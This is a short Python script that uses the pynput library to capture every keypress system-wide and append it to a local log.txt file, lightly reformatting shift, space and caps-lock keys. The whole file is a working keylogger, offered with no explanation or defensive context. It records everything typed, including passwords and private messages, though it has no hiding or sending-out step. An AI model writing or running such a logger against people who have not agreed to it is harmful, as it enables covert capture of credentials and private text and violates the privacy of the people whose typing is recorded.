from pynput.keyboard import Listener

def savetext(key):
    record=str(key)
    record=record.replace("'","")
    record=record.replace("Key.shift","")
    record=record.replace("Key.space"," ")
    record=record.replace("Key.caps_lock"," caps:")

    with open("log.txt","a") as f:
        f.write(record)

with Listener(on_press=savetext) as k:
    k.join()